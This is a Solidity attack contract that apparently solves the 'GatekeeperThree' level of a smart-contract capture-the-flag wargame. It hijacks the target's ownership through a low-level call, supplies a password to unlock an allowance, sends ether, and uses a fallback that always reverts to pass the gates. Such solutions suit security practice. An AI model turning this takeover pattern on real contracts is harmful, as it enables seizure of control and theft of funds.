pragma solidity ^0.4.24;

import '../levels/GatekeeperThree.sol';

contract GatekeeperThreeAttack {

    GatekeeperThree public target;
    address public trick;
    uint public password;
    
    constructor (address _target) public  payable {
      target = GatekeeperThree(_target);
    }
    
    function HackFirst() public {
        address(target).call(bytes4(keccak256("constructor()")));
        trick = address(target.trick());
    }
    
    function HackTwo(uint _password) public {
       password = _password;
       target.getAllowance(_password);
    }
    
    function HackAll() public {
        address(target).send(0.01 ether);
        target.enter();
    }
    
    function () payable public {
        require(1 == 2);
    }
}